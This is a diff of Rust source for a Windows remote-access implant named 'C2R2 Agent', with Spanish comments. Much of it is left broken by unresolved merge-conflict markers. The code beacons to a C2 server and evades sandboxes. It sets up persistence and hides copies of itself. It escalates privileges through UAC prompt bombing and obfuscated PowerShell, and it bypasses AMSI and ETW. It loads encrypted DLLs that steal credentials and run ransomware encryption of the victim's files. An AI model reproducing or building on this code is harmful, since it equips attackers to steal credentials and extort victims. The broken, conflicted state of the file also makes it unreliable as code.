@@ -76,7 +76,11 @@ fn configure_tcp_keepalive(stream: &TcpStream) -> std::io::Result<()> {
     #[cfg(target_os = "windows")]
     {
         use std::os::windows::io::AsRawSocket;
+<<<<<<< HEAD
         use winapi::um::winsock2::{setsockopt, SOCKET, SOL_SOCKET, SO_KEEPALIVE};
+=======
+        use winapi::um::winsock2::{setsockopt, SOL_SOCKET, SO_KEEPALIVE, SOCKET};
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
         unsafe {
             let socket = stream.as_raw_socket() as SOCKET;
@@ -111,7 +115,11 @@ fn create_tls_config() -> Arc<ClientConfig> {
 }
 
 fn main() {
+<<<<<<< HEAD
     debug_print!("DEBUG: C2R2 Agent v2.0 - Beacon Mode (TLS)");
+=======
+    debug_print!("DEBUG: C2R2 Agent v2.0 - Beacon Mode");
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     // ============================================================================
     // ANTI-SANDBOX CHECKS (Production Mode Only)
@@ -127,6 +135,7 @@ fn main() {
         }
     }
 
+<<<<<<< HEAD
     // ============================================================================
     // AUTO-PERSISTENCE (Background Thread)
     // ============================================================================
@@ -146,12 +155,16 @@ fn main() {
 
     // Crear configuración TLS
     let tls_config = create_tls_config();
+=======
+    debug_print!("DEBUG: Conectando a {}", config::C2_SERVER);
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     // Configuración de beacon (60s con 30% jitter por defecto)
     let beacon_config = beacon::BeaconConfig::default();
     let mut retry_count = 0;
 
     loop {
+<<<<<<< HEAD
         // Extraer host y puerto del servidor
         let (host, _port) = match c2_server.rsplit_once(':') {
             Some((h, p)) => (h, p),
@@ -165,6 +178,11 @@ fn main() {
         match TcpStream::connect(c2_server) {
             Ok(tcp_stream) => {
                 debug_print!("DEBUG: Conexión TCP establecida");
+=======
+        match TcpStream::connect(config::C2_SERVER) {
+            Ok(mut stream) => {
+                debug_print!("DEBUG: Conectado al servidor C2");
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
                 // Configurar TCP keepalive para mantener la conexión viva
                 if let Err(e) = configure_tcp_keepalive(&tcp_stream) {
@@ -174,6 +192,7 @@ fn main() {
                     );
                 }
 
+<<<<<<< HEAD
                 // Crear conexión TLS
                 let server_name = match rustls::pki_types::ServerName::try_from(host.to_string()) {
                     Ok(name) => name,
@@ -197,6 +216,19 @@ fn main() {
                 };
 
                 debug_print!("DEBUG: Iniciando conexión TLS...");
+=======
+                // Configurar timeouts para evitar cuelgues indefinidos
+                let read_timeout = Duration::from_secs(300); // 5 minutos
+                let write_timeout = Duration::from_secs(30);  // 30 segundos
+
+                if let Err(e) = stream.set_read_timeout(Some(read_timeout)) {
+                    debug_print!("DEBUG: Warning - No se pudo configurar read timeout: {}", e);
+                }
+
+                if let Err(e) = stream.set_write_timeout(Some(write_timeout)) {
+                    debug_print!("DEBUG: Warning - No se pudo configurar write timeout: {}", e);
+                }
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
                 retry_count = 0; // Reset retry counter on successful connection
                 handle_tls_connection(tcp_stream, tls_conn, &beacon_config);
@@ -710,7 +742,7 @@ fn get_system_info(info_type: &str) -> String {
                     let os_name = String::from_utf8_lossy(&out.stdout).trim().to_string();
                     debug_print!("DEBUG: PowerShell OS output: '{}'", os_name);
                     if !os_name.is_empty() && os_name.to_lowercase().contains("windows") {
-                        debug_print!("DEBUG: ✅ OS detectado: {}", os_name);
+                        debug_print!("DEBUG:  OS detectado: {}", os_name);
                         return os_name;
                     }
                 }
@@ -729,7 +761,7 @@ fn get_system_info(info_type: &str) -> String {
                             if let Some(os_name) = line.split("REG_SZ").nth(1) {
                                 let trimmed = os_name.trim().to_string();
                                 if !trimmed.is_empty() {
-                                    debug_print!("DEBUG: ✅ OS detectado (registry): {}", trimmed);
+                                    debug_print!("DEBUG:  OS detectado (registry): {}", trimmed);
                                     return trimmed;
                                 }
                             }
@@ -751,13 +783,17 @@ fn get_system_info(info_type: &str) -> String {
                         if line.starts_with("Caption=") {
                             let os_name = line.strip_prefix("Caption=").unwrap_or("").trim();
                             if !os_name.is_empty() {
-                                debug_print!("DEBUG: ✅ OS detectado (wmic): {}", os_name);
+                                debug_print!("DEBUG:  OS detectado (wmic): {}", os_name);
                                 return os_name.to_string();
                             }
                         }
                     }
                 }
+<<<<<<< HEAD
                 debug_print!("DEBUG: ❌ Todos los métodos fallaron");
+=======
+                debug_print!("DEBUG:  Todos los métodos fallaron");
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
                 return "Windows".to_string(); // Fallback genérico
             }
@@ -812,9 +848,13 @@ fn execute_command(command: &str) -> String {
 /// MEJORADO: NO copia archivos (detectado por AVs), ejecuta desde ubicación original
 #[cfg(target_os = "windows")]
 fn elevate_agent() -> String {
+<<<<<<< HEAD
     debug_print!(
         "DEBUG: Re-ejecutando agente con privilegios elevados (UAC prompt bombing + LOLBAS)..."
     );
+=======
+    debug_print!("DEBUG: Re-ejecutando agente con privilegios elevados (UAC prompt bombing + LOLBAS)...");
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     // Obtener la ruta del ejecutable actual
     let current_exe = match std::env::current_exe() {
@@ -839,10 +879,14 @@ fn elevate_agent() -> String {
     };
 
     // si falla la elevación con pcalua.exe, retornar error
+<<<<<<< HEAD
     format!(
         "__ERROR__:Falló la elevación del agente con UAC prompt bombing (LOLBAS){}",
         DELIMITER
     )
+=======
+    format!("__ERROR__:Falló la elevación del agente con UAC prompt bombing (LOLBAS){}", DELIMITER)
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 }
 
 /*
@@ -895,7 +939,11 @@ fn copy_to_stealth_location(current_exe: &std::path::Path) -> Result<std::path::
 
         // Intentar copiar
         if let Ok(_) = fs::copy(current_exe, &stealth_path) {
+<<<<<<< HEAD
             debug_print!("DEBUG: ✅ Copiado exitosamente a: {}", stealth_path.display());
+=======
+            debug_print!("DEBUG:  Copiado exitosamente a: {}", stealth_path.display());
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
             // Intentar establecer atributos oculto/sistema usando attrib.exe (más simple)
             #[cfg(target_os = "windows")]
@@ -938,7 +986,10 @@ fn copy_to_stealth_location(current_exe: &std::path::Path) -> Result<std::path::
 #[cfg(target_os = "windows")]
 fn elevate_agent_via_vbs(exe_path: &str) -> Result<String, String> {
     use std::os::windows::process::CommandExt;
+<<<<<<< HEAD
     use std::process::Command;
+=======
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     let temp_dir = std::env::temp_dir();
     let ps_name = format!("~elv{}.ps1", std::process::id());
@@ -989,7 +1040,7 @@ fn elevate_agent_via_vbs(exe_path: &str) -> Result<String, String> {
 
     match output {
         Ok(_) => Ok(format!(
-            "__SUCCESS__:Agente re-ejecutado con privilegios elevados (LOLBAS: pcalua.exe). UAC prompt se mostrará hasta que sea aceptado. Conexión actual se cerrará. El agente elevado se reconectará automáticamente.{}", 
+            "__SUCCESS__:Agente re-ejecutado con privilegios elevados (LOLBAS: pcalua.exe). UAC prompt se mostrará hasta que sea aceptado. Conexión actual se cerrará. El agente elevado se reconectará automáticamente.{}",
             DELIMITER
         )),
         Err(e) => Err(format!("pcalua.exe elevation failed: {}", e)),
@@ -1040,7 +1091,10 @@ fn elevate_command(command: &str) -> String {
 #[cfg(target_os = "windows")]
 fn elevate_via_com(command: &str) -> Result<String, String> {
     use std::os::windows::process::CommandExt;
+<<<<<<< HEAD
     use std::process::Command;
+=======
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     // Crear un archivo batch temporal para ejecutar el comando
     let temp_dir = std::env::temp_dir();
@@ -1098,10 +1152,14 @@ WScript.Sleep 3000"#,
             let _ = fs::remove_file(&vbs_path);
             let _ = fs::remove_file(&output_path);
 
+<<<<<<< HEAD
             format!(
                 "__INFO__:Comando elevado ejecutado (COM)\n{}{}",
                 content, DELIMITER
             )
+=======
+            format!("__INFO__:Comando elevado ejecutado (COM)\n{}{}", content, DELIMITER)
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         }
         Err(_) => {
             // Limpiar archivos temporales
@@ -1120,7 +1178,10 @@ WScript.Sleep 3000"#,
 #[cfg(target_os = "windows")]
 fn elevate_via_shellexecute(command: &str) -> Result<String, String> {
     use std::os::windows::process::CommandExt;
+<<<<<<< HEAD
     use std::process::Command;
+=======
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     // Crear batch temporal
     let temp_dir = std::env::temp_dir();
@@ -1178,10 +1239,19 @@ fn elevate_via_shellexecute(command: &str) -> Result<String, String> {
 #[cfg(target_os = "windows")]
 fn elevate_via_powershell(command: &str) -> String {
     use std::os::windows::process::CommandExt;
+<<<<<<< HEAD
     use std::process::Command;
 
     // Ofuscar el script de PowerShell usando encoding Base64
     let ps_cmd = format!("cmd.exe /c {} > $env:TEMP\\elv_out.txt 2>&1", command);
+=======
+
+    // Ofuscar el script de PowerShell usando encoding Base64
+    let ps_cmd = format!(
+        "cmd.exe /c {} > $env:TEMP\\elv_out.txt 2>&1",
+        command
+    );
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     // Encodear en Base64 para ofuscar
     let encoded_cmd = base64_encode(ps_cmd.as_bytes());
@@ -1409,10 +1479,14 @@ fn upload_file(command: &str) -> String {
     let dest_path = parts[1];
     let encoded_data = parts[2].trim(); // TRIM para eliminar \n y espacios
 
+<<<<<<< HEAD
     debug_print!(
         "DEBUG: Decodificando {} bytes de base64",
         encoded_data.len()
     );
+=======
+    debug_print!("DEBUG: Decodificando {} bytes de base64", encoded_data.len());
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     debug_print!("DEBUG: Ruta destino: {}", dest_path);
 
     match base64_decode(encoded_data) {
@@ -1558,6 +1632,7 @@ fn harvest_credentials() -> String {
         let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
         debug_print!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
 
+<<<<<<< HEAD
         // === EVASION STRATEGY ===
         // No aggressive patching (removed AMSI/ETW bypass to avoid AV signatures)
         // Evasion is achieved through:
@@ -1566,21 +1641,46 @@ fn harvest_credentials() -> String {
         // 3. Encrypted DLL loading - module is XOR encrypted
         // 4. Legitimate Windows APIs - no suspicious memory operations
         debug_print!("DEBUG: [EVASION] Using passive evasion techniques");
+=======
+        // === EVASIÓN AGRESIVA ===
+        debug_print!("DEBUG: [EVASION] Bypassing AMSI...");
+        unsafe {
+            if evasion::bypass_amsi() {
+                debug_print!("DEBUG: [EVASION]  AMSI bypassed");
+            } else {
+                debug_print!("DEBUG: [EVASION]  AMSI bypass failed (puede no estar disponible)");
+            }
+
+            debug_print!("DEBUG: [EVASION] Bypassing ETW...");
+            if evasion::bypass_etw() {
+                debug_print!("DEBUG: [EVASION]  ETW bypassed");
+            } else {
+                debug_print!("DEBUG: [EVASION]  ETW bypass failed");
+            }
+        }
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
         // SIMPLIFICADO: LoadLibrary directo (más confiable)
         use std::ffi::CString;
+<<<<<<< HEAD
         use std::os::raw::c_char;
         use winapi::um::libloaderapi::{FreeLibrary, GetProcAddress, LoadLibraryA};
+=======
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
         // Crear archivo temporal con nombre random
         let temp_dir = std::env::temp_dir();
         let random_name = format!("~tmp{}.tmp", std::process::id());
         let dll_path = temp_dir.join(random_name);
 
+<<<<<<< HEAD
         debug_print!(
             "DEBUG: [EVASION] Writing DLL to temp: {}",
             dll_path.display()
         );
+=======
+        debug_print!("DEBUG: [EVASION] Writing DLL to temp: {}", dll_path.display());
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         if let Err(e) = std::fs::write(&dll_path, &dll_bytes) {
             return format!("__ERROR__:Failed to write DLL: {}{}", e, DELIMITER);
         }
@@ -1595,7 +1695,11 @@ fn harvest_credentials() -> String {
                 return format!("__ERROR__:LoadLibrary failed{}", DELIMITER);
             }
 
+<<<<<<< HEAD
             debug_print!("DEBUG: [EVASION] ✅ DLL loaded at: {:p}", h_module);
+=======
+            debug_print!("DEBUG: [EVASION]  DLL loaded at: {:p}", h_module);
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
             // GetProcAddress
             let fn_name = CString::new("steal_credentials").unwrap();
@@ -1607,16 +1711,24 @@ fn harvest_credentials() -> String {
                 return format!("__ERROR__:steal_credentials not found{}", DELIMITER);
             }
 
+<<<<<<< HEAD
             debug_print!("DEBUG: [EVASION] ✅ Function found, executing...");
+=======
+            debug_print!("DEBUG: [EVASION]  Function found, executing...");
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
             // Ejecutar función CON PROTECCIÓN CONTRA CRASHES
             debug_print!("DEBUG: [EVASION] Calling steal_credentials()...");
             let exec_fn: extern "C" fn() -> *mut c_char = std::mem::transmute(fn_ptr);
             let result_ptr = exec_fn();
+<<<<<<< HEAD
             debug_print!(
                 "DEBUG: [EVASION] steal_credentials() returned: {:p}",
                 result_ptr
             );
+=======
+            debug_print!("DEBUG: [EVASION] steal_credentials() returned: {:p}", result_ptr);
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
             if result_ptr.is_null() {
                 FreeLibrary(h_module);
@@ -1681,15 +1793,20 @@ fn handle_persistence(method_str: &str) -> String {
 
     match persistence::establish_persistence(method) {
         Ok(msg) => {
-            debug_print!("DEBUG: [PERSISTENCE] ✅ {}", msg);
+            debug_print!("DEBUG: [PERSISTENCE]  {}", msg);
             format!("__SUCCESS__:{}{}", msg, DELIMITER)
         }
         Err(e) => {
+<<<<<<< HEAD
             debug_print!("DEBUG: [PERSISTENCE] ❌ Error: {}", e);
             format!(
                 "__ERROR__:Error estableciendo persistencia: {}{}",
                 e, DELIMITER
             )
+=======
+            debug_print!("DEBUG: [PERSISTENCE]  Error: {}", e);
+            format!("__ERROR__:Error estableciendo persistencia: {}{}", e, DELIMITER)
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         }
     }
 }
@@ -1698,15 +1815,20 @@ fn handle_persistence(method_str: &str) -> String {
 fn handle_persistence_remove() -> String {
     match persistence::remove_persistence() {
         Ok(msg) => {
-            debug_print!("DEBUG: [PERSISTENCE] ✅ Limpieza: {}", msg);
+            debug_print!("DEBUG: [PERSISTENCE]  Limpieza: {}", msg);
             format!("__SUCCESS__:Persistencia removida: {}{}", msg, DELIMITER)
         }
         Err(e) => {
+<<<<<<< HEAD
             debug_print!("DEBUG: [PERSISTENCE] ❌ Error limpieza: {}", e);
             format!(
                 "__ERROR__:Error removiendo persistencia: {}{}",
                 e, DELIMITER
             )
+=======
+            debug_print!("DEBUG: [PERSISTENCE]  Error limpieza: {}", e);
+            format!("__ERROR__:Error removiendo persistencia: {}{}", e, DELIMITER)
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         }
     }
 }
@@ -1737,11 +1859,15 @@ fn encrypt_files(params: &str) -> String {
         let path = parts[0].trim();
         let max_depth: u32 = parts[1].trim().parse().unwrap_or(5);
 
+<<<<<<< HEAD
         debug_print!(
             "DEBUG: encrypt_files - path='{}', max_depth={}",
             path,
             max_depth
         );
+=======
+        debug_print!("DEBUG: encrypt_files - path='{}', max_depth={}", path, max_depth);
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
         // Verificar que existan los archivos subidos
         if !Path::new("ransomware.enc").exists() {
@@ -1776,22 +1902,48 @@ fn encrypt_files(params: &str) -> String {
         let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
         debug_print!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
 
+<<<<<<< HEAD
         // Evasion: passive techniques only (no aggressive patching)
         debug_print!("DEBUG: [EVASION] Using passive evasion techniques");
+=======
+        // Evasión
+        debug_print!("DEBUG: [EVASION] Bypassing AMSI...");
+        unsafe {
+            if evasion::bypass_amsi() {
+                debug_print!("DEBUG: [EVASION]  AMSI bypassed");
+            } else {
+                debug_print!("DEBUG: [EVASION]  AMSI bypass failed");
+            }
+
+            debug_print!("DEBUG: [EVASION] Bypassing ETW...");
+            if evasion::bypass_etw() {
+                debug_print!("DEBUG: [EVASION]  ETW bypassed");
+            } else {
+                debug_print!("DEBUG: [EVASION]  ETW bypass failed");
+            }
+        }
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
         // Cargar DLL
         use std::ffi::CString;
+<<<<<<< HEAD
         use std::os::raw::c_char;
         use winapi::um::libloaderapi::{FreeLibrary, GetProcAddress, LoadLibraryA};
+=======
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
         let temp_dir = std::env::temp_dir();
         let random_name = format!("~tmp{}.tmp", std::process::id());
         let dll_path = temp_dir.join(random_name);
 
+<<<<<<< HEAD
         debug_print!(
             "DEBUG: [EVASION] Writing DLL to temp: {}",
             dll_path.display()
         );
+=======
+        debug_print!("DEBUG: [EVASION] Writing DLL to temp: {}", dll_path.display());
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         if let Err(e) = std::fs::write(&dll_path, &dll_bytes) {
             return format!("__ERROR__:Failed to write DLL: {}{}", e, DELIMITER);
         }
@@ -1805,7 +1957,11 @@ fn encrypt_files(params: &str) -> String {
                 return format!("__ERROR__:LoadLibrary failed{}", DELIMITER);
             }
 
+<<<<<<< HEAD
             debug_print!("DEBUG: [EVASION] ✅ DLL loaded at: {:p}", h_module);
+=======
+            debug_print!("DEBUG: [EVASION]  DLL loaded at: {:p}", h_module);
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
             let fn_name = CString::new("encrypt_directory").unwrap();
             let fn_ptr = GetProcAddress(h_module, fn_name.as_ptr());
@@ -1816,7 +1972,11 @@ fn encrypt_files(params: &str) -> String {
                 return format!("__ERROR__:encrypt_directory not found{}", DELIMITER);
             }
 
+<<<<<<< HEAD
             debug_print!("DEBUG: [EVASION] ✅ Function found, executing...");
+=======
+            debug_print!("DEBUG: [EVASION]  Function found, executing...");
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
             // Ejecutar función
             let path_c = CString::new(path).unwrap();
@@ -1840,14 +2000,23 @@ fn encrypt_files(params: &str) -> String {
                 free_fn(result_ptr);
             }
 
+<<<<<<< HEAD
             // ⚠️  NO descargar la DLL ni eliminar el archivo
+=======
+            //   NO descargar la DLL ni eliminar el archivo
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             // El diálogo de ransomware se ejecuta en un thread separado
             // y necesita que la DLL permanezca cargada en memoria
             // La DLL y el archivo temporal permanecerán hasta que el proceso termine
             // o hasta que el usuario ingrese la key correcta
 
+<<<<<<< HEAD
             // FreeLibrary(h_module);  // ❌ COMENTADO: No descargar DLL
             // let _ = std::fs::remove_file(&dll_path);  // ❌ COMENTADO: No eliminar archivo
+=======
+            // FreeLibrary(h_module);  //  COMENTADO: No descargar DLL
+            // let _ = std::fs::remove_file(&dll_path);  //  COMENTADO: No eliminar archivo
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
             debug_print!("DEBUG: DLL permanece cargada para el diálogo persistente");
 
@@ -1902,12 +2071,16 @@ fn decrypt_files(params: &str) -> String {
             .replace("←[201~", "");
         let max_depth: u32 = parts[2].trim().parse().unwrap_or(5);
 
+<<<<<<< HEAD
         debug_print!(
             "DEBUG: decrypt_files - path='{}', key_hex='{}', max_depth={}",
             path,
             key_hex,
             max_depth
         );
+=======
+        debug_print!("DEBUG: decrypt_files - path='{}', key_hex='{}', max_depth={}", path, key_hex, max_depth);
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
         // Verificar que existan los archivos subidos
         if !Path::new("ransomware.enc").exists() {
@@ -1941,13 +2114,24 @@ fn decrypt_files(params: &str) -> String {
         let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
         debug_print!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
 
+<<<<<<< HEAD
         // Evasion: passive techniques only
         // No aggressive patching to avoid AV detection
+=======
+        // Evasión
+        unsafe {
+            evasion::bypass_amsi();
+            evasion::bypass_etw();
+        }
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
         // Cargar DLL
         use std::ffi::CString;
+<<<<<<< HEAD
         use std::os::raw::c_char;
         use winapi::um::libloaderapi::{FreeLibrary, GetProcAddress, LoadLibraryA};
+=======
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
         let temp_dir = std::env::temp_dir();
         let random_name = format!("~tmp{}.tmp", std::process::id());
